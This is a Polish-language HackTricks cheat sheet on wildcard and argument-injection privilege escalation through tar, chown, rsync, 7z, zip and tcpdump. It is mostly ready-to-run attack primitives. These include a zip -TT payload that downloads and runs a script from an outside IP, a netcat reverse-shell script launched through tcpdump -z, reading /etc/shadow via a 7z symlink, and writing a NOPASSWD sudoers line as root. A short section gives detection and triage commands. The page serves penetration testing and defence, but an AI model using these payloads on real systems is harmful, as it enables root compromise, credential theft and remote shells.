# Dodatkowe sztuczki z wildcardami

{{#include ../../banners/hacktricks-training.md}}

> **argument injection** w przypadku wildcard (aka *glob*) występuje, gdy uprzywilejowany skrypt uruchamia binarny plik Unix, taki jak `tar`, `chown`, `rsync`, `zip`, `7z`, … z nieujętym w cudzysłów wildcardem, takim jak `*`.
> Ponieważ shell rozwija wildcard **przed** wykonaniem pliku binarnego, atakujący, który może tworzyć pliki w katalogu roboczym, może przygotować nazwy plików zaczynające się od `-`, dzięki czemu zostaną zinterpretowane jako **opcje zamiast danych**, skutecznie przemycając dowolne flagi, a nawet polecenia.<sup>[[6]](#references)</sup>
> Ta strona zawiera najbardziej użyteczne primitives, najnowsze badania oraz nowoczesne metody wykrywania z lat 2023-2025.

## chown / chmod

Możesz **skopiować właściciela/grupę lub bity uprawnień z pliku referencyjnego**, wykorzystując flagę `--reference`, gdy nazwa pliku wyglądająca jak opcja zostanie rozwinięta przez wildcard.<sup>[[6]](#references)[[8]](#references)[[9]](#references)</sup>
```bash
# attacker-controlled directory
touch -- .drf.php
chmod 777 -- .drf.php
touch -- "--reference=.drf.php"   # ← filename becomes an argument
```
Gdy root później wykonuje coś takiego:
```bash
chown -R alice:alice *.php
chmod -R 644 *.php
```
Rozwinięte `--reference=.drf.php` zastępuje jawnie określonego właściciela i tryb, powodując, że pasujące pliki dziedziczą metadane z `.drf.php` (a przy powyższej konfiguracji stają się zapisywalne przez atakującego).<sup>[[6]](#references)</sup>

*PoC i narzędzie*: [`wildpwn`](https://github.com/localh0t/wildpwn) (połączony atak).<sup>[[7]](#references)</sup>
Zobacz także klasyczny artykuł DefenseCode, aby uzyskać szczegółowe informacje.<sup>[[6]](#references)</sup>

---

## tar

### GNU tar

Wykonuj dowolne polecenia, wykorzystując funkcję **checkpoint** GNU tar oraz akcje checkpointów.<sup>[[10]](#references)</sup>
```bash
# attacker-controlled directory
echo 'echo pwned > /tmp/pwn' > shell.sh
chmod +x shell.sh
touch -- "--checkpoint=1"
touch -- "--checkpoint-action=exec=sh shell.sh"
```
Gdy root uruchomi np. `tar -czf /root/backup.tgz *`, `shell.sh` zostanie wykonany jako root.<sup>[[10]](#references)</sup>

### Zastrzeżenie dotyczące nadpisywania kompresora bsdtar / macOS

Domyślny `tar` w nowszych wersjach macOS (oparty na `libarchive`) nie udostępnia interfejsu `--checkpoint` znanego z GNU tar, ale bsdtar dokumentuje **--use-compress-program** do wyboru zewnętrznego kompresora.<sup>[[11]](#references)</sup>
```bash
# macOS example
touch -- "--use-compress-program=sh"
```
Gdy uprzywilejowany skrypt uruchamia `tar -cf backup.tar *`, wybiera `sh` za pośrednictwem `PATH` ofiary, a bsdtar uruchamia go jako kompresor.<sup>[[11]](#references)</sup> Dowodzi to wstrzyknięcia opcji, ale samo w sobie nie stanowi niezawodnego mechanizmu wykonywania dowolnych poleceń: nazwa pliku utworzona przez wildcard nie może zawierać `/`, a bsdtar przekazuje dane archiwum, a nie wybrane przez atakującego polecenie powłoki. Wykonanie kodu wymaga dodatkowo kontrolowanego pliku wykonywalnego rozwiązywanego przez `PATH` lub innego kanału argumentów, który może wskazywać użyteczny program.

---

## rsync

`rsync` pozwala nadpisać zdalną powłokę lub zdalny plik binarny za pomocą flag wiersza poleceń, takich jak `-e` i `--rsync-path`.<sup>[[12]](#references)</sup>
```bash
# attacker-controlled directory
touch -- "-e sh shell.sh"        # -e <cmd> => use <cmd> instead of ssh
```
Jeśli root później zarchiwizuje katalog za pomocą `rsync -az * backup:/srv/`, wstrzyknięta flaga może uruchomić shell za pośrednictwem mechanizmu remote-shell.<sup>[[7]](#references)[[12]](#references)</sup>

*PoC*: [`wildpwn`](https://github.com/localh0t/wildpwn) (tryb `rsync`).

---

## 7-Zip / 7z / 7za

Nawet gdy uprzywilejowany skrypt *defensywnie* poprzedza wildcard symbolem `--` (aby zatrzymać parsowanie opcji), CLI 7-Zip akceptuje **pliki listy plików** poprzez poprzedzenie nazwy pliku znakiem `@`. Połączenie tego z symlinkiem pozwala *eksfiltrować dowolne pliki*.<sup>[[13]](#references)</sup>
```bash
# directory writable by low-priv user
cd /path/controlled
ln -s /etc/shadow   root.txt      # file we want to read
touch @root.txt                  # tells 7z to use root.txt as file list
```
Jeśli root wykona coś takiego:
```bash
7za a /backup/`date +%F`.7z -t7z -snl -- *
```
7-Zip spróbuje odczytać `root.txt` (→ `/etc/shadow`) jako listę plików i przerwie działanie, **wypisując zawartość na stderr**.<sup>[[13]](#references)</sup>

Działa to również z `-- *`, ponieważ CLI 7-Zip jawnie akceptuje zarówno zwykłe nazwy plików, jak i `@listfiles` jako argumenty pozycyjne, więc dosłowna nazwa pliku, taka jak `@root.txt`, nadal jest traktowana specjalnie.<sup>[[13]](#references)</sup>

---

## zip

Istnieją dwa bardzo praktyczne primitives, gdy aplikacja przekazuje kontrolowane przez użytkownika nazwy plików do `zip` (przez wildcard albo przez wyliczanie nazw bez `--`).<sup>[[2]](#references)[[3]](#references)</sup>

- RCE przez test hook: `-T` włącza „test archive”, a `-TT <cmd>` zastępuje tester dowolnym programem (długa forma: `--unzip-command <cmd>`). Jeśli możesz wstrzyknąć nazwy plików zaczynające się od `-`, rozdziel flagi na różne nazwy plików, aby parsowanie short-options działało poprawnie.<sup>[[2]](#references)[[3]](#references)</sup>
```bash
# Attacker-controlled filenames (e.g., in an upload directory)
# 1) A file literally named: -T
# 2) A file named: -TT wget 10.10.14.17 -O s.sh; bash s.sh; echo x
# 3) Any benign file to include (e.g., data.pcap)
# When the privileged code runs: zip out.zip <files...>
# zip will execute: wget 10.10.14.17 -O s.sh; bash s.sh; echo x
```
Uwagi
- NIE próbuj używać pojedynczej nazwy pliku, takiej jak `'-T -TT <cmd>'` — krótkie opcje są analizowane znak po znaku i zakończy się to niepowodzeniem. Użyj osobnych tokenów, jak pokazano.<sup>[[3]](#references)</sup>
- Jeśli aplikacja usuwa ukośniki z nazw plików, pobierz plik z podstawowego hosta/adresu IP (domyślna ścieżka `/index.html`) i zapisz go lokalnie za pomocą `-O`, a następnie wykonaj.<sup>[[3]](#references)</sup>
- Możesz debugować analizowanie za pomocą `-sc` (pokazuje przetworzone argv) lub `-h2` (więcej pomocy), aby zrozumieć, jak przetwarzane są tokeny.<sup>[[3]](#references)</sup>

Przykład (lokalne działanie w zip 3.0).<sup>[[3]](#references)</sup>
```bash
zip test.zip -T '-TT wget 10.10.14.17/shell.sh' test.pcap    # fails to parse
zip test.zip -T '-TT wget 10.10.14.17 -O s.sh; bash s.sh' test.pcap  # runs wget + bash
```
- Data exfil/leak: Jeśli warstwa webowa przekazuje stdout/stderr programu `zip` (częste w przypadku naiwnych wrapperów), wstrzyknięte flagi, takie jak `--help`, lub błędy wynikające z nieprawidłowych opcji pojawią się w odpowiedzi HTTP, potwierdzając command-line injection i ułatwiając dostrajanie payloadu.<sup>[[3]](#references)</sup>

---

## Dodatkowe kandydatury do option-injection

Gdy uprzywilejowany wrapper rozwija zapisywalny katalog za pomocą wildcard, warto sprawdzić opisane poniżej hooks opcji.<sup>[[15]](#references)[[16]](#references)[[17]](#references)</sup>

| Binary | Flaga do wykorzystania | Efekt |
| --- | --- | --- |
| `flock` | `-c <cmd>` | Przekazuje string polecenia do shella |
| `git`   | `-c core.sshCommand=<cmd>` | Używa `<cmd>` zamiast SSH do Git fetch/push |
| `scp`   | `-S <program>` | Używa alternatywnego programu połączenia kompatybilnego z SSH |

Te primitives są przydatne do sprawdzania również poza klasycznymi przypadkami *tar/rsync/zip*.

---

## Wyszukiwanie podatnych wrapperów i zadań

Nowsze case studies i wskazówki dotyczące detection pokazują, że wildcard/argv injection nie jest już wyłącznie problemem **cron + tar**.<sup>[[3]](#references)[[4]](#references)[[5]](#references)</sup> Ta sama klasa błędów nadal pojawia się w:

- funkcjach webowych, które „pobierają wszystko jako zip/tar” z kontrolowanych przez attackera katalogów uploadu
- powłokach debugowania dostawców/appliance, które udostępniają wrapper **tcpdump** z kontrolowanymi przez attackera polami nazwy pliku/filtra
- zadaniach backupu lub rotacji, które wywołują `tar`, `rsync`, `7z`, `zip`, `chown` lub `chmod` na zapisywalnych katalogach

Przydatne polecenia triage (wywołanie `pspy` używa udokumentowanych flag procesu/zdarzeń plikowych oraz interwału).<sup>[[14]](#references)</sup>
```bash
# Hunt for interesting binaries fed with globs or positional user data
rg -n --hidden --follow \
'(tar|bsdtar|rsync|zip|7z|7za|chown|chmod|tcpdump).*(\*|\$@|\$\*)' \
/etc /opt /usr/local /srv 2>/dev/null

# Watch real argv during cron/systemd execution
pspy64 -pf -i 1000 | rg 'tar|rsync|zip|7z|tcpdump|chown|chmod'

# Sudoers rules that constrain one argument but still allow extra flags
sudo -l
rg -n 'tcpdump|zip|tar|rsync' /etc/sudoers /etc/sudoers.d 2>/dev/null
```
Szybkie heurystyki:

- `-- *` to dobre rozwiązanie dla wielu narzędzi GNU, ale **nie** dla `7z`/`7za`, ponieważ `@listfiles` są analizowane osobno.<sup>[[13]](#references)</sup>
- W przypadku `zip` szukaj wrapperów, które bezpośrednio wyliczają kontrolowane przez użytkownika nazwy plików; dzielenie short-option (`-T` + `-TT <cmd>`) nadal działa nawet bez globu powłoki.<sup>[[2]](#references)[[3]](#references)</sup>
- W przypadku `tcpdump` zwróć szczególną uwagę na wrappery umożliwiające kontrolowanie **nazw plików wyjściowych**, **ustawień rotacji** lub argumentów **odtwarzania plików przechwytywania**.<sup>[[18]](#references)</sup>

---

## Hooki rotacji tcpdump (-G/-W/-z): RCE przez wstrzykiwanie argv w wrapperach

Gdy restricted shell lub vendor wrapper buduje wiersz poleceń `tcpdump` przez konkatenację kontrolowanych przez użytkownika pól (np. parametru „nazwa pliku”) bez ścisłego quoting/validation, można przemycić dodatkowe flagi `tcpdump`. Połączenie `-G` (rotacja zależna od czasu), `-W` (ograniczenie liczby plików) i `-z <cmd>` (polecenie wykonywane po rotacji) umożliwia wykonanie dowolnych poleceń jako użytkownik uruchamiający tcpdump (często root na appliance’ach).<sup>[[1]](#references)[[4]](#references)[[18]](#references)</sup>

Warunki wstępne:

- Możesz wpływać na `argv` przekazywane do `tcpdump` (np. za pośrednictwem wrappera takiego jak `/debug/tcpdump --filter=... --file-name=<HERE>`).<sup>[[4]](#references)[[18]](#references)</sup>
- Wrapper nie sanityzuje spacji ani tokenów rozpoczynających się od `-` w polu nazwy pliku.<sup>[[4]](#references)</sup>

Klasyczny PoC (wykonuje skrypt reverse shell z zapisywalnej ścieżki).<sup>[[4]](#references)[[18]](#references)</sup>
```sh
# Reverse shell payload saved on the device (e.g., USB, tmpfs)
cat > /mnt/disk1_1/rce.sh <<'EOF'
#!/bin/sh
rm -f /tmp/f; mknod /tmp/f p; cat /tmp/f|/bin/sh -i 2>&1|nc 192.0.2.10 4444 >/tmp/f
EOF
chmod +x /mnt/disk1_1/rce.sh

# Inject additional tcpdump flags via the unsafe "file name" field
/debug/tcpdump --filter="udp port 1234" \
--file-name="test -i any -W 1 -G 1 -z /mnt/disk1_1/rce.sh"

# On the attacker host
nc -6 -lvnp 4444 &
# Then send any packet that matches the BPF to force a rotation
printf x | nc -u -6 [victim_ipv6] 1234
```
Szczegóły:

- `-G 1` wykonuje rotację co sekundę, a `-W 1` zatrzymuje działanie po jednym obróconym pliku; przechwytywanie musi otrzymać pasujący pakiet przed rotacją.<sup>[[18]](#references)</sup>
- `-z <cmd>` uruchamia polecenie post-rotate raz na każdą rotację i przekazuje ścieżkę zamkniętego savefile jako argument; upewnij się, że obsługa argumentów przez skrypt/interpreter odpowiada Twojemu payloadowi.<sup>[[18]](#references)</sup>

Warianty bez nośnika wymiennego:

- Jeśli masz dowolny inny primitive do zapisywania plików (np. osobny wrapper polecenia umożliwiający przekierowanie wyjścia), umieść swój skrypt w znanej ścieżce i wywołaj `-z /path/script.sh`; w razie potrzeby skrypt powinien sam wywołać `/bin/sh`.<sup>[[18]](#references)</sup>
- Jeśli vendor wrapper pozwala wybrać ścieżkę obróconego pliku, przeanalizuj tę kontrolę ścieżki wyłącznie w połączeniu z poleceniem post-rotate, które interpretuje argument savefile; sama kontrola ścieżki nie wykonuje zawartości pliku.<sup>[[18]](#references)</sup>

---

## sudoers: tcpdump z wildcardami/dodatkowymi argumentami → arbitralny zapis/odczyt i root

Przykładowy antywzorzec sudoers:<sup>[[3]](#references)</sup>
```text
(ALL : ALL) NOPASSWD: /usr/bin/tcpdump -c10 -w/var/cache/captures/*/<GUID-PATTERN> -F/var/cache/captures/filter.<GUID-PATTERN>
```
Reguła pozostawia kilka opcji dostępnych w udokumentowanym parserze `tcpdump`:<sup>[[3]](#references)[[18]](#references)</sup>
- Glob `*` i permisywne wzorce ograniczają tylko pierwszy argument `-w`. `tcpdump` akceptuje wiele opcji `-w`; obowiązuje ostatnia.<sup>[[3]](#references)[[18]](#references)</sup>
- Reguła nie ogranicza innych opcji, więc dozwolone są `-Z`, `-r`, `-V` itd.<sup>[[3]](#references)[[18]](#references)</sup>

Poniżej udokumentowano odpowiednie prymitywy.<sup>[[3]](#references)[[18]](#references)</sup>
- Nadpisz ścieżkę docelową za pomocą drugiego `-w` (pierwszy spełnia tylko warunek sudoers).<sup>[[3]](#references)[[18]](#references)</sup>
```bash
sudo tcpdump -c10 -w/var/cache/captures/a/ \
-w /dev/shm/out.pcap \
-F /var/cache/captures/filter.aaaaaaaa-aaaa-aaaa-aaaa-aaaaaaaaaaaa
```
- Path traversal w pierwszym `-w`, aby wyjść poza ograniczone drzewo.<sup>[[3]](#references)</sup>
```bash
sudo tcpdump -c10 \
-w/var/cache/captures/a/../../../../dev/shm/out \
-F/var/cache/captures/filter.aaaaaaaa-aaaa-aaaa-aaaa-aaaaaaaaaaaa
```
- Wymuś własność plików przez `-Z root` (tworzy pliki należące do root w dowolnym miejscu).<sup>[[3]](#references)[[18]](#references)</sup>
```bash
sudo tcpdump -c10 -w/var/cache/captures/a/ -Z root \
-w /dev/shm/root-owned \
-F /var/cache/captures/filter.aaaaaaaa-aaaa-aaaa-aaaa-aaaaaaaaaaaa
```
- Zapis dowolnej treści poprzez odtworzenie spreparowanego pliku PCAP za pomocą `-r` (np. w celu dodania wiersza do sudoers).<sup>[[3]](#references)[[18]](#references)</sup>

<details>
<summary>Utwórz plik PCAP zawierający dokładny ładunek ASCII i zapisz go jako root</summary>
```bash
# On attacker box: craft a UDP packet stream that carries the target line
printf '\n\nfritz ALL=(ALL:ALL) NOPASSWD: ALL\n' > sudoers
sudo tcpdump -w sudoers.pcap -c10 -i lo -A udp port 9001 &
cat sudoers | nc -u 127.0.0.1 9001; kill %1

# On victim (sudoers rule allows tcpdump as above)
sudo tcpdump -c10 -w/var/cache/captures/a/ -Z root \
-r sudoers.pcap -w /etc/sudoers.d/1111-aaaa \
-F /var/cache/captures/filter.aaaaaaaa-aaaa-aaaa-aaaa-aaaaaaaaaaaa
```
- Dowolny odczyt pliku/wyciek sekretów za pomocą `-V <file>` (interpretuje listę savefiles). Diagnostyka błędów często wyświetla linie, ujawniając ich zawartość.<sup>[[3]](#references)[[18]](#references)</sup>
```bash
sudo tcpdump -c10 -w/var/cache/captures/a/ -V /root/root.txt \
-w /tmp/dummy \
-F /var/cache/captures/filter.aaaaaaaa-aaaa-aaaa-aaaa-aaaaaaaaaaaa
```
---

## References

- [1] [GTFOBins - tcpdump](https://gtfobins.github.io/gtfobins/tcpdump/)
- [2] [GTFOBins - zip](https://gtfobins.github.io/gtfobins/zip/)
- [3] [0xdf - HTB Dump: wstrzyknięcie argumentu zip do RCE + privesc przez błędną konfigurację sudo tcpdump](https://0xdf.gitlab.io/2025/11/04/htb-dump.html)
- [4] [FiberGateway GR241AG - pełny łańcuch exploitacji](https://r0ny.net/FiberGateway-GR241AG-Full-Exploit-Chain/)
- [5] [Elastic - wykryto potencjalny shell przez wstrzyknięcie wildcardu](https://www.elastic.co/guide/en/security/current/prebuilt-rule-8-19-20-potential-shell-via-wildcard-injection-detected.html)
- [6] [Powrót do przyszłości: Unix Wildcards Gone Wild (DefenseCode)](https://www.exploit-db.com/papers/33930)
- [7] [wildpwn](https://github.com/localh0t/wildpwn)
- [8] [GNU Coreutils - wywołanie `chown`](https://www.gnu.org/software/coreutils/manual/html_node/chown-invocation.html)
- [9] [GNU Coreutils - wywołanie `chmod`](https://www.gnu.org/software/coreutils/manual/html_node/chmod-invocation.html)
- [10] [GNU tar - checkpoints](https://www.gnu.org/software/tar/manual/html_section/checkpoints.html)
- [11] [Podręcznik bsdtar(1)](https://man.freebsd.org/cgi/man.cgi?query=bsdtar&sektion=1)
- [12] [Podręcznik rsync(1)](https://download.samba.org/pub/rsync/rsync.1)
- [13] [Składnia wiersza poleceń 7-Zip](https://7-zip.opensource.jp/chm/cmdline/syntax.htm)
- [14] [pspy](https://github.com/DominicBreuker/pspy)
- [15] [Podręcznik flock(1)](https://kernel.googlesource.com/pub/scm/utils/util-linux/util-linux/+/refs/tags/v2.41.1/sys-utils/flock.1.adoc)
- [16] [Dokumentacja konfiguracji Git](https://git-scm.com/docs/git-config)
- [17] [Podręcznik `scp` OpenBSD](https://man.openbsd.org/scp)
- [18] [Podręcznik tcpdump(8)](https://man7.org/linux/man-pages/man8/tcpdump.8.html)
{{#include ../../banners/hacktricks-training.md}}
